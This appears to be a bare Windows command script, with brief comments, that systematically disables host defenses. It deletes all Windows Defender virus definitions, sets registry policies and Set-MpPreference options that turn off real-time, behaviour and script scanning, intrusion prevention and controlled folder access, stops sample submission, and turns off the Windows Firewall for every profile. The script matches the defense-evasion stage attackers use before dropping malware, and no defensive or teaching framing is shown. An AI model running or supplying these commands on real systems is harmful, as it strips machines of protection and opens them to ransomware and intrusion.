# Remove all Windows Defender virus definitions
cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all 
# Disable real-time monitoring via registry policy
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring " /t REG_DWORD /d 1 /f 
# Disable behavior monitoring via registry policy
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f
# Configure Windows Defender preferences via PowerShell (disables IPS, IOAV protection, real-time monitoring, script scanning, controlled folder access; sets network protection to audit mode; disables MAPS reporting; never submits samples)
powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
# Disable Windows Firewall for all profiles (Domain, Private, Public)
NetSh Advfirewall set allprofiles state off
